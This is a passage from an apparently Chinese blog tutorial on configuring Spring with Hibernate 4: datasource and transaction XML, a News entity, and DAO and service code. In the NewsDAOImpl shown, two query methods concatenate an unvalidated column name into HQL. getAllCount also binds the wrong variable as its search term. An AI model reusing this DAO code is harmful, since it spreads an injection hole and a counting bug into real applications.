class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:database.properties"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 配合数据库连接池 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.driver&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.url&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.user&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.password&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.max&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"minPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.min&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"initialPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.init&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxIdleTime"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.idle&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sessionFactory"</span></span></span></span><br><span class="line"><span class="xml">class="org.springframework.orm.hibernate4.LocalSessionFactoryBean"&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span></span></span></span><br><span class="line"><span class="xml">value="classpath:hibernate.cfg.xml"&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 就表示这个项目里面引用数据源关系 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 配置事务处理，所有的事务都采用AOP的方式，本处只声明SessionFactory要进行事务处控制--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"transactionManager"</span></span></span></span><br><span class="line"><span class="xml">class="org.springframework.orm.hibernate4.HibernateTransactionManager"&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sessionFactory"</span> <span class="attr">ref</span>=<span class="string">"sessionFactory"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 事务的配置声明 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:annotation-driven</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"txAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"insert*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"update*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"delete*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"add*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"edit*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"change*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"login*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"get*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"load*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"list*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 定义事务的切入点 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">aop:config</span> <span class="attr">expose-proxy</span>=<span class="string">"true"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">expression</span>=<span class="string">"execution(* com.tianxingjian..service.*.*(..))"</span> <span class="attr">id</span>=<span class="string">"pointcut"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"txAdvice"</span> <span class="attr">pointcut-ref</span>=<span class="string">"pointcut"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span></span><br></pre></td></tr></table></figure><hr><h2 id="2-编写src代码用于本次测试"><a href="#2-编写src代码用于本次测试" class="headerlink" title="2. 编写src代码用于本次测试"></a><strong>2. 编写src代码用于本次测试</strong></h2><h3 id="2-1-生成News-java的POJO类"><a href="#2-1-生成News-java的POJO类" class="headerlink" title="2.1 生成News.java的POJO类"></a><strong>2.1 生成News.java的POJO类</strong></h3><p>我们利用Annotation的注解方式完成：</p><ul><li>windows -&gt; perspetive -&gt; open perspective -&gt;  database explore -&gt; 右键mysql -&gt; 连接</li><li>找到要处理的表 -&gt; 右键Hibernate reverse -&gt; src为项目的src路径，java package一般为com.tianxingjian.pojo -&gt; √create pojo -&gt; 点击add Hibernate mapping annotations to pojo -&gt; next -&gt; id generator -&gt; native -&gt; next -&gt; 点击表然后native -&gt; finish，生成pojo的时候最好把create abstract class取消掉，生成之后为了便于之后的JUnit测试加上toString方法，完整的News.java代码如下：<br>上述操作完成之后pojo类的映射操作将自动保存在hibernate.cfg.xml文件中，代码如下：</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Column;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GeneratedValue;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Table;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Temporal;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.TemporalType;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * News entity. <span class="doctag">@author</span> MyEclipse Persistence Tools</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = <span class="meta-string">"news"</span>, catalog = <span class="meta-string">"news_db"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">News</span> <span class="title">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fields</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Integer nid;</span><br><span class="line"><span class="keyword">private</span> String title;</span><br><span class="line"><span class="keyword">private</span> Date date;</span><br><span class="line"><span class="keyword">private</span> String content;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructors</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** default constructor */</span></span><br><span class="line"><span class="keyword">public</span> News() &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** full constructor */</span></span><br><span class="line"><span class="keyword">public</span> News(String title, Date date, String content) &#123;</span><br><span class="line"><span class="keyword">this</span>.title = title;</span><br><span class="line"><span class="keyword">this</span>.date = date;</span><br><span class="line"><span class="keyword">this</span>.content = content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Property accessors</span></span><br><span class="line"><span class="meta">@Id</span></span><br><span class="line"><span class="meta">@GeneratedValue</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Column(name = <span class="meta-string">"nid"</span>, unique = true, nullable = false)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Integer getNid() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.nid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void setNid(Integer nid) &#123;</span><br><span class="line"><span class="keyword">this</span>.nid = nid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Column(name = <span class="meta-string">"title"</span>, length = 100)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String getTitle() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.title;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void setTitle(String title) &#123;</span><br><span class="line"><span class="keyword">this</span>.title = title;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Temporal(TemporalType.DATE)</span></span><br><span class="line"><span class="meta">@Column(name = <span class="meta-string">"date"</span>, length = 10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Date getDate() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void setDate(Date date) &#123;</span><br><span class="line"><span class="keyword">this</span>.date = date;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Column(name = <span class="meta-string">"content"</span>, length = 100)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String getContent() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void setContent(String content) &#123;</span><br><span class="line"><span class="keyword">this</span>.content = content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String toString() &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"News [nid="</span> + nid + <span class="string">", title="</span> + title + <span class="string">", date="</span> + date + <span class="string">", content="</span> + content + <span class="string">"]\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;mapping <span class="keyword">class</span>=<span class="string">"com.tianxingjian.pojo.News"</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2-定义INewsDAO-java接口"><a href="#2-2-定义INewsDAO-java接口" class="headerlink" title="2.2 定义INewsDAO.java接口"></a><strong>2.2 定义INewsDAO.java接口</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.dao;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">INewsDAO</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doCreate</span><span class="params">(News vo)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doUpdate</span><span class="params">(News vo)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> News <span class="title">getElementById</span><span class="params">(Integer id)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">doRemoveBatch</span><span class="params">(Set&lt;Integer&gt; ids)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;News&gt; <span class="title">findAll</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;News&gt; <span class="title">findAllSplit</span><span class="params">(String column, String keyWord, </span></span></span><br><span class="line"><span class="function"><span class="params">Integer currentPage, Integer lineSize)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">getAllCount</span><span class="params">(String column, String keyWord)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-实现NewsDAOImpl-java类"><a href="#2-2-实现NewsDAOImpl-java类" class="headerlink" title="2.2 实现NewsDAOImpl.java类"></a><strong>2.2 实现NewsDAOImpl.java类</strong></h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.dao.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="keyword">annotation</span>.Resource;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.Criteria;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.Query;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.SessionFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.dao.INewsDAO;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewsDAOImpl</span> <span class="title">implements</span> <span class="title">INewsDAO</span> </span>&#123;</span><br><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">private</span> SessionFactory sessionFactory;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> boolean doCreate(News vo) throws Exception &#123;</span><br><span class="line"><span class="keyword">return</span> sessionFactory.getCurrentSession().save(vo) != <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> boolean doUpdate(News vo) throws Exception &#123;</span><br><span class="line">String hql = <span class="string">"update News set title=?, date=?, content=? where nid=?"</span>;</span><br><span class="line">Query query = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createQuery(hql);</span><br><span class="line">query.setParameter(<span class="number">0</span>, vo.getTitle());</span><br><span class="line">query.setParameter(<span class="number">1</span>, vo.getDate());</span><br><span class="line">query.setParameter(<span class="number">2</span>, vo.getContent());</span><br><span class="line">query.setParameter(<span class="number">3</span>, vo.getNid());</span><br><span class="line"><span class="keyword">return</span> query.executeUpdate() &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> News getElementById(Integer id) throws Exception &#123;</span><br><span class="line"><span class="keyword">return</span> (News) <span class="keyword">this</span>.sessionFactory.getCurrentSession().<span class="keyword">get</span>(News.<span class="keyword">class</span>, id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123;</span><br><span class="line">StringBuffer buffer = new StringBuffer();</span><br><span class="line">buffer.append(<span class="string">"delete from News where nid in ("</span>);</span><br><span class="line">Iterator&lt;Integer&gt; iterator = ids.iterator();</span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">buffer.append(iterator.next()).append(<span class="string">","</span>);</span><br><span class="line">&#125;</span><br><span class="line">buffer.delete(buffer.length()-<span class="number">1</span>, buffer.length()).append(<span class="string">")"</span>);</span><br><span class="line">Query query = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createQuery(buffer.toString());</span><br><span class="line"><span class="keyword">return</span> query.executeUpdate() &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(<span class="meta-string">"unchecked"</span>)</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;News&gt; findAll() throws Exception &#123;</span><br><span class="line">Criteria criteria = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createCriteria(News.<span class="keyword">class</span>);</span><br><span class="line"><span class="keyword">return</span> criteria.list();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(<span class="meta-string">"unchecked"</span>)</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123;</span><br><span class="line">String hql = <span class="string">"from News as n where n."</span> + column + <span class="string">" like ?"</span>;</span><br><span class="line">Query query = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createQuery(hql);</span><br><span class="line">query.setParameter(<span class="number">0</span>, <span class="string">"%"</span> + keyWord + <span class="string">"%"</span>);</span><br><span class="line">query.setFirstResult((currentPage-<span class="number">1</span>)*lineSize);</span><br><span class="line">query.setMaxResults(lineSize);</span><br><span class="line"><span class="keyword">return</span> query.list();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Integer getAllCount(String column, String keyWord) throws Exception &#123;</span><br><span class="line">String hql = <span class="string">"select count(*) from News as n where n."</span> + column + <span class="string">" like ?"</span>;</span><br><span class="line">Query query = <span class="keyword">this</span>.sessionFactory.getCurrentSession().createQuery(hql);</span><br><span class="line">query.setParameter(<span class="number">0</span>, <span class="string">"%"</span> + column + <span class="string">"%"</span>);</span><br><span class="line"><span class="built_in">Long</span> count = (<span class="built_in">Long</span>) query.uniqueResult();</span><br><span class="line"><span class="keyword">return</span> count.intValue();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-定义业务层INewsService-java接口"><a href="#2-3-定义业务层INewsService-java接口" class="headerlink" title="2.3 定义业务层INewsService.java接口"></a><strong>2.3 定义业务层INewsService.java接口</strong></h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package com.tianxingjian.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">List</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Map</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Set</span>;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> interface INewsService &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> insert(News vo) throws Exception;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> update(News vo) throws Exception;</span><br><span class="line"><span class="keyword">public</span> News get(<span class="built_in">Integer</span> id) throws Exception;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> delete(<span class="built_in">Set</span>&lt;<span class="built_in">Integer</span>&gt; ids) throws Exception;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">List</span>&lt;News&gt; <span class="built_in">list</span>() throws Exception;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">Map</span>&lt;<span class="built_in">String</span>, Object&gt; <span class="built_in">list</span>(<span class="built_in">String</span> column, <span class="built_in">String</span> <span class="built_in">keyWord</span>, </span><br><span class="line"><span class="built_in">Integer</span> currentPage, <span class="built_in">Integer</span> lineSize) throws Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-编写测试程序，用JUnit"><a href="#2-4-编写测试程序，用JUnit" class="headerlink" title="2.4 编写测试程序，用JUnit"></a><strong>2.4 编写测试程序，用JUnit</strong></h3><blockquote><ul><li>点击IServiceImpl</li><li>点击MyEclipse右上角的New图标</li><li>查询Junit Test Case</li><li>将package改为com.tianxingjian.test -&gt; next</li><li>全选 -&gt; 